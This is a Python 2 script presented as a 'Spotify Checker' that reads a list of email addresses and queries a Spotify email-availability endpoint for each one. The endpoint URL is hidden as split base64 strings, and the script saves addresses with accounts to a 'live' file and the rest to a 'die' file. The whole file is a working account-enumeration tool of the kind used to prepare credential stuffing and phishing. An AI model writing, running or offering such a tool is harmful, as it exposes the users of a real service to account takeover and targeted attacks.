def main():
	## By DsXWEB19778 #facebook.com/name.path
	## Python LOVER <3 
	## Github/DsWeb19778
	import os
	from os import path as y
	import platform as p
	import datetime as dt
	import base64
	try:
	 	import requests as qs
	except ImportError:
		print("[!] Requests install :>> python -m pip install requests")
		sys.exit(1)
	import sys
	import time
	def mydate(): # FUnction FOr DATE
		year = dt.datetime.now().year
		month = dt.datetime.now().month
		day = dt.datetime.now().day
		print("[+] Scan at "+str(year)+"/"+str(month)+"/"+str(day))	
	fi55 = "WlsYWJsZS5waHA/\nZW1haWw9"
	giv_p = p.system()
	if(giv_p == "Windows"):
		os.system("cls")
		color_green = "a"
		color_red = "c"
		os.system("color "+str(color_red))
	else:
		os.system("clear")
	print("[!] SPotify @C")
	print("[1] SPotify Checker")
	print("[2] HELP")
	fi54 = "veGhyL2pzb24vaXNFbWFpbEF2Y"	
	def header():
		year = dt.datetime.now().year
		time_ = time.ctime()
		giv_p = p.system()
		print("--! DsXWeb19778 @c")
		print("--! SPotify Checker "+str(year))
		print("--! System : "+str(giv_p)+" & "+str(time_))
		print("[!] Usage :>> python sp.py [Just RUN Script]")
	def helps():
		print("[!] RZLT : Live and Die Emails")
		print("[!] Contact : http://www.facebook.com/name.path")
	choiss = raw_input("[?] Select 1 OR 2 >> ")
	if (choiss == "1"):
		header()
		mydate()
		if(y.isdir("rzlt")):
			print("[+] Dir Exist.")
		else:
			os.mkdir("rzlt")
			print("[+] File Created.")	
		ask = raw_input("[+] Mailist File ??==>> ")
		timeout = raw_input("[+] TIMEOUT >> ")
		fi53 = "aHR0cHM6Ly93d3cuc3BvdGlmeS5jb20vaWQ"
		mod_file = "r"
		mylist = open(ask,mod_file)
		read_me = mylist.readlines()
		xcount = len(read_me)
		if (xcount >= 2000):
			msg = ", Long CHECK o_o"
		else:
			msg = ", ^_^"	
		print("[+] EMAILS : "+str(len(read_me))+msg)
		for i in read_me:
			mailist = i.strip()
			decode_me = base64.decodestring(fi53+fi54+fi55)
			exploit = decode_me+str(mailist)
			get = qs.get(exploit,timeout=int(timeout))
			last_rzlt = get.content
			if (last_rzlt == "true"):
				print("[-] >>> Die email : ["+str(mailist)+"]")
				save_invalid = open("rzlt/die.txt","a+")
				save_invalid.write("\n"+mailist)
			elif (last_rzlt == "false"):
				print("[+] >>> Live Email : ["+str(mailist)+"]")
				save_valid = open("rzlt/live.txt","a+")
				save_valid.write("\n"+mailist)
			else:
				raw_input("Server Problem Enter for [Exiiiit] >> ")
				print("Exiit ...")
				time.sleep(3)
				sys.exit(1)
	elif (choiss == "2"):
		header()
		helps()

	else:			
		sys.exit(1)	

if __name__ == '__main__':
		main() # MAIN FUNCTION [EXECUTE]